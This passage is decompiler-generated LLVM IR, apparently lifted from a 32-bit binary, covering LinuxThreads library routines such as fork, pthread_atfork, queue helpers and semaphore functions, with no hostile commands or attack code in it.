  unreachable

dec_label_pc_804c003:                             ; preds = %dec_label_pc_804bb22
  store i32 1, i32* @global_var_8063248.141, align 8
  %v0_804c00d = call i32 @pthread_reap_children()
  %v0_804c012 = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  store i32 %v0_804c012, i32* %eax.global-to-local, align 4
  store i32 %v0_804c012, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c023

dec_label_pc_804c023:                             ; preds = %dec_label_pc_804bf3b, %dec_label_pc_804c003
  %storemerge = phi i32 [ %v0_804c012, %dec_label_pc_804c003 ], [ %storemerge.pre, %dec_label_pc_804bf3b ]
  store i32 %storemerge, i32* @eax, align 4
  %v0_804c023 = call i32 @restart()
  store i32 %v0_804c023, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bacbthread-pre-split

dec_label_pc_804c02d:                             ; preds = %dec_label_pc_804bb22
  %v1_804c030 = add i32 %v0_804bb39, 72
  %v2_804c030 = inttoptr i32 %v1_804c030 to i32*
  %v3_804c030 = load i32, i32* %v2_804c030, align 4
  %v6_804c030 = inttoptr i32 %v0_804bb39 to i32*
  store i32 %v3_804c030, i32* %v6_804c030, align 4
  %v0_804c034 = call i32 @__new_sem_post()
  store i32 %v0_804c034, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c05e

dec_label_pc_804c05e:                             ; preds = %dec_label_pc_804c02d, %dec_label_pc_804bf93, %dec_label_pc_804bf7a
  %v0_804c05e = load i32, i32* @esp, align 4
  %v1_804c05e = add i32 %v0_804c05e, 16
  br label %dec_label_pc_804bacb

; uselistorder directives
  uselistorder i32 %v2_804bfe9, { 1, 0, 2 }
  uselistorder i32 %v2_804bfd5, { 1, 0, 2 }
  uselistorder i32 %v2_804bfcc, { 1, 0, 2 }
  uselistorder i32 %v2_804bfb8, { 1, 0, 2 }
  uselistorder i32 %v2_804bef9, { 1, 0 }
  uselistorder i32 %v2_804bee0, { 1, 0 }
  uselistorder i32 %v1_804bede, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bf2b, { 2, 1, 0 }
  uselistorder i32 %v0_804bf2b, { 1, 0 }
  uselistorder i32 %v0_804be8a, { 1, 0 }
  uselistorder i32 %v0_804be54, { 1, 0 }
  uselistorder i32 %v5_804be45, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804be3b, { 1, 0 }
  uselistorder i32 %v1_804bd70, { 1, 0 }
  uselistorder i32 %v2_804bcfd, { 1, 0 }
  uselistorder i32 %v1_804bcb0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804bba6, { 1, 0 }
  uselistorder i32 %v1_804bc59, { 1, 0 }
  uselistorder i32 %v2_804bc46, { 1, 0 }
  uselistorder i32 %v1_804bc2b, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder i32 %tmp49, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804bc0a, { 1, 0, 2 }
  uselistorder i32 %v2_804bbb8, { 1, 0 }
  uselistorder i32 %v0_804bba695, { 2, 0, 1 }
  uselistorder i32 %v3_804bba686, { 1, 0 }
  uselistorder i32 %v0_804bb64, { 1, 0, 2 }
  uselistorder i32 %v1_804bb39, { 1, 2, 0 }
  uselistorder i32 %v0_804bb39, { 7, 6, 3, 4, 5, 0, 1, 2, 8, 9 }
  uselistorder i32 %v0_804bb18, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_804bb15, { 1, 0 }
  uselistorder i32 %v1_804bae2, { 1, 0, 2 }
  uselistorder i32 %v1_804bacb, { 5, 4, 3, 2, 1, 0 }
  uselistorder i16* %v4_804bdde, { 1, 0 }
  uselistorder i32* %v1_804bf97, { 2, 1, 0 }
  uselistorder i32 %v2_804ba0f, { 3, 2, 1, 5, 4, 0, 7, 6, 9, 8, 10 }
  uselistorder i32 %v0_804ba07, { 4, 5, 0, 1, 6, 2, 3 }
  uselistorder i32* %stack_var_-16, { 11, 6, 5, 10, 9, 2, 3, 1, 0, 8, 7, 4, 12 }
  uselistorder i32* %edx.global-to-local, { 20, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %eax.global-to-local, { 0, 71, 72, 78, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 77, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 74, 69, 70, 94, 95, 96, 73, 75, 79, 76, 80, 81, 82, 84, 83, 85, 86, 88, 87, 89, 91, 90, 92, 93 }
  uselistorder i32 ()* @restart, { 1, 2, 0 }
  uselistorder i32 ()* @pthread_free, { 1, 0 }
  uselistorder i32 ()* @pthread_reap_children, { 1, 0 }
  uselistorder i32* @global_var_8063244.140, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 16, 17, 18, 15, 6, 7, 5, 8, 3, 4, 9, 1, 2, 0, 12, 13, 19, 20, 10, 11, 14, 23, 22, 21 }
  uselistorder label %dec_label_pc_804c023, { 1, 0 }
  uselistorder label %dec_label_pc_804bff9, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd9, { 1, 0 }
  uselistorder label %dec_label_pc_804bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_804bf93, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bf3b, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804bef5, { 1, 0 }
  uselistorder label %dec_label_pc_804bed9, { 1, 0 }
  uselistorder label %dec_label_pc_804be9e, { 1, 0 }
  uselistorder label %dec_label_pc_804be80, { 1, 0 }
  uselistorder label %dec_label_pc_804bdc1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdb8, { 1, 0 }
  uselistorder label %dec_label_pc_804bdb5, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb0, { 1, 0 }
  uselistorder label %dec_label_pc_804bc23, { 1, 0 }
  uselistorder label %dec_label_pc_804bc1f, { 1, 0 }
  uselistorder label %dec_label_pc_804bbb4, { 1, 0 }
  uselistorder label %dec_label_pc_804bb15, { 1, 0 }
  uselistorder label %dec_label_pc_804bacb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bacbthread-pre-split, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804ba69, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_804c06b = load i32, i32* bitcast (i32** @global_var_80628bc.161 to i32*), align 4
  store i32 %v0_804c06b, i32* @eax, align 4
  %v1_804c070 = call i32 @__pthread_lock(i32 ptrtoint (i32* @0 to i32))
  %v0_804c078 = load i32, i32* bitcast (i32** @global_var_80628bc.161 to i32*), align 4
  %v1_804c07e = inttoptr i32 %v0_804c078 to i32*
  %v2_804c07e = call i32 @__pthread_unlock(i32* %v1_804c07e)
  %v1_804c088 = call i32 @__pthread_manager(i32 %arg1)
  ret i32 %v1_804c088
}

define i32 @pthread_insert_list(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c090 = load i32, i32* @edx, align 4
  %v1_804c090 = icmp eq i32 %v0_804c090, 0
  %v0_804c092 = load i32, i32* @ebx, align 4
  store i32 %v0_804c092, i32* %stack_var_-4, align 4
  %v0_804c093 = load i32, i32* @eax, align 4
  store i32 %v0_804c093, i32* %ebx.global-to-local, align 4
  br i1 %v1_804c090, label %dec_label_pc_804c0b2, label %dec_label_pc_804c097

dec_label_pc_804c097:                             ; preds = %entry
  %v4_804c097 = icmp eq i32 %arg1, 0
  %v1_804c09c = icmp eq i1 %v4_804c097, false
  br i1 %v1_804c09c, label %dec_label_pc_804c0a3.preheader, label %dec_label_pc_804c0a9

dec_label_pc_804c0a3.preheader:                   ; preds = %dec_label_pc_804c097
  %v1_804c0a32 = inttoptr i32 %v0_804c093 to i32*
  %v2_804c0a33 = load i32, i32* %v1_804c0a32, align 4
  %v1_804c0a54 = icmp eq i32 %v2_804c0a33, 0
  %v1_804c0a711 = icmp eq i1 %v1_804c0a54, false
  br i1 %v1_804c0a711, label %dec_label_pc_804c0a0, label %dec_label_pc_804c0a9

dec_label_pc_804c0a0:                             ; preds = %dec_label_pc_804c0a3.preheader, %dec_label_pc_804c0a0
  %v2_804c0a312 = phi i32 [ %v2_804c0a3, %dec_label_pc_804c0a0 ], [ %v2_804c0a33, %dec_label_pc_804c0a3.preheader ]
  %v1_804c0a0 = add i32 %v2_804c0a312, 4
  store i32 %v1_804c0a0, i32* %ebx.global-to-local, align 4
  %v1_804c0a3 = inttoptr i32 %v1_804c0a0 to i32*
  %v2_804c0a3 = load i32, i32* %v1_804c0a3, align 4
  %v1_804c0a5 = icmp eq i32 %v2_804c0a3, 0
  %v1_804c0a7 = icmp eq i1 %v1_804c0a5, false
  br i1 %v1_804c0a7, label %dec_label_pc_804c0a0, label %dec_label_pc_804c0a3.dec_label_pc_804c0a9.loopexit_crit_edge

dec_label_pc_804c0a3.dec_label_pc_804c0a9.loopexit_crit_edge: ; preds = %dec_label_pc_804c0a0
  br label %dec_label_pc_804c0a9

dec_label_pc_804c0a9:                             ; preds = %dec_label_pc_804c0a3.preheader, %dec_label_pc_804c0a3.dec_label_pc_804c0a9.loopexit_crit_edge, %dec_label_pc_804c097
  %v1_804c0a9 = load i32, i32* @ecx, align 4
  %v2_804c0a9 = inttoptr i32 %v1_804c0a9 to i32*
  store i32 %v0_804c090, i32* %v2_804c0a9, align 4
  %v0_804c0ab = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0ab = inttoptr i32 %v0_804c0ab to i32*
  %v2_804c0ab = load i32, i32* %v1_804c0ab, align 4
  %v1_804c0ad = load i32, i32* @ecx, align 4
  %v2_804c0ad = add i32 %v1_804c0ad, 4
  %v3_804c0ad = inttoptr i32 %v2_804c0ad to i32*
  store i32 %v2_804c0ab, i32* %v3_804c0ad, align 4
  %v0_804c0b0 = load i32, i32* @ecx, align 4
  %v1_804c0b0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c0b0 = inttoptr i32 %v1_804c0b0 to i32*
  store i32 %v0_804c0b0, i32* %v2_804c0b0, align 4
  %v2_804c0b2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804c0b2

dec_label_pc_804c0b2:                             ; preds = %entry, %dec_label_pc_804c0a9
  %v2_804c0b2 = phi i32 [ %v0_804c092, %entry ], [ %v2_804c0b2.pre, %dec_label_pc_804c0a9 ]
  %.0 = phi i32 [ undef, %entry ], [ %v2_804c0ab, %dec_label_pc_804c0a9 ]
  store i32 %v2_804c0b2, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804c0a3, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804c0b2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0a9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c0a0, { 1, 0 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_804c0b5 = load i32, i32* @eax, align 4
  store i32 %v0_804c0b5, i32* %ebx.global-to-local, align 4
  %v1_804c0c12 = icmp eq i32 %v0_804c0b5, 0
  %v1_804c0c39 = icmp eq i1 %v1_804c0c12, false
  br i1 %v1_804c0c39, label %dec_label_pc_804c0bc.lr.ph, label %dec_label_pc_804c0c5

dec_label_pc_804c0bc.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804c0bc

dec_label_pc_804c0bc:                             ; preds = %dec_label_pc_804c0bc.lr.ph, %dec_label_pc_804c0bc
  %v4_804c0bc = phi i32 [ %v0_804c0b5, %dec_label_pc_804c0bc.lr.ph ], [ %v3_804c0be, %dec_label_pc_804c0bc ]
  %v5_804c0bc = inttoptr i32 %v4_804c0bc to i32*
  %v6_804c0bc = load i32, i32* %v5_804c0bc, align 4
  call void @__pseudo_call(i32 %v6_804c0bc)
  %v0_804c0be = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0be = add i32 %v0_804c0be, 4
  %v2_804c0be = inttoptr i32 %v1_804c0be to i32*
  %v3_804c0be = load i32, i32* %v2_804c0be, align 4
  store i32 %v3_804c0be, i32* %ebx.global-to-local, align 4
  %v1_804c0c1 = icmp eq i32 %v3_804c0be, 0
  %v1_804c0c3 = icmp eq i1 %v1_804c0c1, false
  br i1 %v1_804c0c3, label %dec_label_pc_804c0bc, label %dec_label_pc_804c0c1.dec_label_pc_804c0c5_crit_edge

dec_label_pc_804c0c1.dec_label_pc_804c0c5_crit_edge: ; preds = %dec_label_pc_804c0bc
  %v2_804c0c5.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804c0c5

dec_label_pc_804c0c5:                             ; preds = %dec_label_pc_804c0c1.dec_label_pc_804c0c5_crit_edge, %entry
  %v2_804c0c5 = phi i32 [ %v2_804c0c5.pre, %dec_label_pc_804c0c1.dec_label_pc_804c0c5_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_804c0c5

; uselistorder directives
  uselistorder i32 %v3_804c0be, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c0bc, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c0c9 = load i32, i32* @ebp, align 4
  %v0_804c0ca = load i32, i32* @edi, align 4
  %v0_804c0cb = load i32, i32* @esi, align 4
  %v0_804c0cc = load i32, i32* @ebx, align 4
  store i32 %v0_804c0cc, i32* %stack_var_-16, align 4
  %v1_804c0d5 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063250.162 to i32))
  %v0_804c0da = load i32, i32* @global_var_8063268.163, align 8
  store i32 %v0_804c0da, i32* @eax, align 4
  %v0_804c0df = load i32, i32* @global_var_806326c.164, align 4
  store i32 %v0_804c0df, i32* @ebp, align 4
  %v0_804c0e5 = load i32, i32* @global_var_8063270.165, align 16
  store i32 %v0_804c0e5, i32* @ebx, align 4
  %v0_804c0eb = call i32 @pthread_call_handlers()
  %v0_804c0f0 = call i32 @__pthread_once_fork_prepare()
  %v1_804c0fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  %v0_804c101 = call i32 @__libc_fork()
  %v1_804c109 = icmp eq i32 %v0_804c101, 0
  store i32 %v0_804c101, i32* @edi, align 4
  %v1_804c10d = icmp eq i1 %v1_804c109, false
  br i1 %v1_804c10d, label %dec_label_pc_804c18e, label %dec_label_pc_804c10f

dec_label_pc_804c10f:                             ; preds = %entry
  %v2_804c11b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c11b, i32* @ebx, align 4
  %v2_804c120 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_804c12a = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_804c137 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32), i32* nonnull %stack_var_-20)
  %v1_804c13f = call i32 @pthread_mutexattr_destroy(i32 %v2_804c11b)
  %v2_804c14f = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_804c159 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
  %v3_804c166 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8063250.162 to i32), i32* nonnull %stack_var_-20)
  %v1_804c16e = call i32 @pthread_mutexattr_destroy(i32 %v2_804c11b)
  %v0_804c176 = call i32 @__pthread_reset_main_thread()
  %v0_804c17b = call i32 @__fresetlockfiles()
  %v0_804c180 = call i32 @__pthread_once_fork_child()
  %v0_804c185 = load i32, i32* @ebp, align 4
  store i32 %v0_804c185, i32* @eax, align 4
  %v0_804c187 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_804c1b6

dec_label_pc_804c18e:                             ; preds = %entry
  %v1_804c196 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  %v1_804c1a2 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063250.162 to i32))
  %v0_804c1a7 = call i32 @__pthread_once_fork_parent()
  %v0_804c1ac = load i32, i32* @ebx, align 4
  store i32 %v0_804c1ac, i32* @eax, align 4
  %v0_804c1ae = call i32 @pthread_call_handlers()
  br label %dec_label_pc_804c1b6

dec_label_pc_804c1b6:                             ; preds = %dec_label_pc_804c10f, %dec_label_pc_804c18e
  %v0_804c1b9 = load i32, i32* @edi, align 4
  %v2_804c1bb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c1bb, i32* @ebx, align 4
  store i32 %v0_804c0cb, i32* @esi, align 4
  store i32 %v0_804c0ca, i32* @edi, align 4
  store i32 %v0_804c0c9, i32* @ebp, align 4
  ret i32 %v0_804c1b9

; uselistorder directives
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c1b6, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v1_804c1c0 = call i32 @fork(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804c1c0
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_804c1cb = call i32 @malloc(i32 24)
  store i32 %v1_804c1cb, i32* @ebx, align 4
  %v1_804c1da = icmp eq i32 %v1_804c1cb, 0
  br i1 %v1_804c1da, label %dec_label_pc_804c232, label %dec_label_pc_804c1de

dec_label_pc_804c1de:                             ; preds = %entry
  %v1_804c1e6 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063250.162 to i32))
  store i32 %v1_804c1cb, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8063268.163 to i32), i32* @eax, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804c1f8 = call i32 @pthread_insert_list(i32 0)
  %v1_804c1fd = add i32 %v1_804c1cb, 8
  store i32 %v1_804c1fd, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8063270.165 to i32), i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  %v1_804c20b = call i32 @pthread_insert_list(i32 1)
  %v1_804c210 = add i32 %v1_804c1cb, 16
  store i32 %v1_804c210, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_806326c.164 to i32), i32* @eax, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804c21e = call i32 @pthread_insert_list(i32 1)
  %v1_804c228 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063250.162 to i32))
  br label %dec_label_pc_804c232

dec_label_pc_804c232:                             ; preds = %entry, %dec_label_pc_804c1de
  %v0_804c235 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_804c1de ]
  ret i32 %v0_804c235

; uselistorder directives
  uselistorder i32 %v1_804c1cb, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @pthread_insert_list, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c232, { 1, 0 }
}

define i32 @enqueue() local_unnamed_addr {
entry:
  %v0_804c239 = load i32, i32* @edx, align 4
  %v1_804c239 = add i32 %v0_804c239, 24
  %v2_804c239 = inttoptr i32 %v1_804c239 to i32*
  %v3_804c239 = load i32, i32* %v2_804c239, align 4
  store i32 %v3_804c239, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c255 = load i32, i32* @ebx, align 4
  store i32 %v0_804c255, i32* %stack_var_-4, align 4
  %v0_804c256 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804c274

dec_label_pc_804c25a:                             ; preds = %dec_label_pc_804c274
  %v1_804c25a = load i32, i32* @edx, align 4
  %v12_804c25a = icmp eq i32 %v2_804c274, %v1_804c25a
  %v1_804c25c = icmp eq i1 %v12_804c25a, false
  %v1_804c271 = add i32 %v2_804c274, 8
  br i1 %v1_804c25c, label %dec_label_pc_804c274, label %dec_label_pc_804c25e

dec_label_pc_804c25e:                             ; preds = %dec_label_pc_804c25a
  %v2_804c25e = inttoptr i32 %v1_804c271 to i32*
  %v3_804c25e = load i32, i32* %v2_804c25e, align 4
  store i32 %v3_804c25e, i32* %v1_804c274, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_804c25e, align 4
  %v2_804c27c.pre = load i32, i32* %stack_var_-4, align 4
  %v0_804c27d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c27c

dec_label_pc_804c274:                             ; preds = %dec_label_pc_804c25a, %entry
  %v1_804c261 = phi i32 [ %v0_804c256, %entry ], [ %v1_804c271, %dec_label_pc_804c25a ]
  %v1_804c274 = inttoptr i32 %v1_804c261 to i32*
  %v2_804c274 = load i32, i32* %v1_804c274, align 4
  %v1_804c276 = icmp eq i32 %v2_804c274, 0
  %v1_804c278 = icmp eq i1 %v1_804c276, false
  br i1 %v1_804c278, label %dec_label_pc_804c25a, label %dec_label_pc_804c27a

dec_label_pc_804c27a:                             ; preds = %dec_label_pc_804c274
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c27c

dec_label_pc_804c27c:                             ; preds = %dec_label_pc_804c25e, %dec_label_pc_804c27a
  %v0_804c27d = phi i32 [ %v0_804c27d.pre, %dec_label_pc_804c25e ], [ 0, %dec_label_pc_804c27a ]
  %v2_804c27c = phi i32 [ %v2_804c27c.pre, %dec_label_pc_804c25e ], [ %v0_804c255, %dec_label_pc_804c27a ]
  store i32 %v2_804c27c, i32* @ebx, align 4
  ret i32 %v0_804c27d

; uselistorder directives
  uselistorder i32 %v2_804c274, { 2, 0, 1 }
  uselistorder i32* %v1_804c274, { 1, 0 }
  uselistorder i32 %v1_804c271, { 1, 0 }
  uselistorder label %dec_label_pc_804c27c, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804c282 = add i32 %arg1, 8
  %v2_804c282 = inttoptr i32 %v1_804c282 to i32*
  %v3_804c282 = load i32, i32* %v2_804c282, align 4
  store i32 %v3_804c282, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804c28e = load i32, i32* @esi, align 4
  %v0_804c28f = load i32, i32* @edx, align 4
  store i32 %v0_804c28f, i32* @esi, align 4
  %v0_804c291 = load i32, i32* @ebx, align 4
  %v0_804c292 = load i32, i32* @eax, align 4
  store i32 %v0_804c292, i32* @ebx, align 4
  %v1_804c297 = icmp eq i32 %v0_804c28f, 0
  br i1 %v1_804c297, label %dec_label_pc_804c2a3, label %dec_label_pc_804c29b

dec_label_pc_804c29b:                             ; preds = %entry
  %v1_804c29b = add i32 %v0_804c292, 64
  %v2_804c29b = inttoptr i32 %v1_804c29b to i8*
  %v3_804c29b = load i8, i8* %v2_804c29b, align 1
  %v4_804c29b = icmp eq i8 %v3_804c29b, 0
  %v1_804c29f = icmp eq i1 %v4_804c29b, false
  br i1 %v1_804c29f, label %dec_label_pc_804c2c5, label %dec_label_pc_804c2ad

dec_label_pc_804c2a3:                             ; preds = %entry
  %v1_804c2a3 = add i32 %v0_804c292, 28
  %v2_804c2a3 = inttoptr i32 %v1_804c2a3 to i32*
  %v3_804c2a3 = load i32, i32* %v2_804c2a3, align 4
  store i32 %v3_804c2a3, i32* @eax, align 4
  store i32 %v0_804c292, i32* @edx, align 4
  %v1_804c2a8 = call i32 @__pthread_lock(i32 %v0_804c291)
  %v1_804c2af.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c2ad

dec_label_pc_804c2ad:                             ; preds = %dec_label_pc_804c29b, %dec_label_pc_804c2a3
  %v1_804c2af = phi i32 [ %v0_804c292, %dec_label_pc_804c29b ], [ %v1_804c2af.pre, %dec_label_pc_804c2a3 ]
  %v2_804c2af = add i32 %v1_804c2af, 444
  %v3_804c2af = inttoptr i32 %v2_804c2af to i32*
  store i32 %v0_804c28f, i32* %v3_804c2af, align 4
  %v1_804c2b5 = icmp eq i1 %v1_804c297, false
  br i1 %v1_804c2b5, label %dec_label_pc_804c2c5, label %dec_label_pc_804c2b7

dec_label_pc_804c2b7:                             ; preds = %dec_label_pc_804c2ad
  %v0_804c2ba = load i32, i32* @ebx, align 4
  %v1_804c2ba = add i32 %v0_804c2ba, 28
  %v2_804c2ba = inttoptr i32 %v1_804c2ba to i32*
  %v3_804c2ba = load i32, i32* %v2_804c2ba, align 4
  %v1_804c2bd = inttoptr i32 %v3_804c2ba to i32*
  %v2_804c2bd = call i32 @__pthread_unlock(i32* %v1_804c2bd)
  br label %dec_label_pc_804c2c5

dec_label_pc_804c2c5:                             ; preds = %dec_label_pc_804c2ad, %dec_label_pc_804c29b, %dec_label_pc_804c2b7
  %v2_804c2c5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c291, i32* @ebx, align 4
  store i32 %v0_804c28e, i32* @esi, align 4
  ret i32 %v2_804c2c5

; uselistorder directives
  uselistorder i32 %v0_804c28f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c2c5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c2ad, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v1_804c2cc = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804c2d1 = inttoptr i32 %v1_804c2cc to i32*
  store i32 38, i32* %v1_804c2d1, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v1_804c2e1 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804c2e6 = inttoptr i32 %v1_804c2e1 to i32*
  store i32 38, i32* %v1_804c2e6, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v1_804c2f6 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804c2fb = inttoptr i32 %v1_804c2f6 to i32*
  store i32 38, i32* %v1_804c2fb, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804c310 = add i32 %arg1, 12
  %v2_804c310 = inttoptr i32 %v1_804c310 to i32*
  %v3_804c310 = load i32, i32* %v2_804c310, align 4
  %v4_804c310 = icmp eq i32 %v3_804c310, 0
  br i1 %v4_804c310, label %dec_label_pc_804c324, label %dec_label_pc_804c316

dec_label_pc_804c316:                             ; preds = %entry
  %v1_804c316 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804c31e = inttoptr i32 %v1_804c316 to i32*
  store i32 16, i32* %v1_804c31e, align 4
  %v0_804c324.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c324

dec_label_pc_804c324:                             ; preds = %entry, %dec_label_pc_804c316
  %v0_804c324 = phi i32 [ 0, %entry ], [ %v0_804c324.pre, %dec_label_pc_804c316 ]
  ret i32 %v0_804c324

; uselistorder directives
  uselistorder label %dec_label_pc_804c324, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_804c32d = load i32, i32* @ebx, align 4
  store i32 %v0_804c32d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804c337 = call i32 @__pthread_lock(i32 %v0_804c32d)
  %v0_804c33c = load i32, i32* @ebx, align 4
  %v1_804c33c = add i32 %v0_804c33c, 8
  %v2_804c33c = inttoptr i32 %v1_804c33c to i32*
  %v3_804c33c = load i32, i32* %v2_804c33c, align 4
  %v1_804c33f = icmp eq i32 %v3_804c33c, 0
  %v1_804c341 = icmp eq i1 %v1_804c33f, false
  br i1 %v1_804c341, label %dec_label_pc_804c353, label %dec_label_pc_804c343

dec_label_pc_804c343:                             ; preds = %entry
  %v0_804c343 = load i32, i32* %stack_var_-8, align 4
  %v1_804c343 = call i32 @__errno_location(i32 %v0_804c343)
  store i32 -1, i32* @esi, align 4
  %v1_804c34b = inttoptr i32 %v1_804c343 to i32*
  store i32 11, i32* %v1_804c34b, align 4
  br label %dec_label_pc_804c359

dec_label_pc_804c353:                             ; preds = %entry
  %v1_804c353 = add i32 %v3_804c33c, -1
  store i32 0, i32* @esi, align 4
  store i32 %v1_804c353, i32* %v2_804c33c, align 4
  br label %dec_label_pc_804c359

dec_label_pc_804c359:                             ; preds = %dec_label_pc_804c343, %dec_label_pc_804c353
  %v0_804c35c = load i32, i32* @ebx, align 4
  %v1_804c35d = inttoptr i32 %v0_804c35c to i32*
  %v2_804c35d = call i32 @__pthread_unlock(i32* %v1_804c35d)
  %v0_804c365 = load i32, i32* @esi, align 4
  ret i32 %v0_804c365

; uselistorder directives
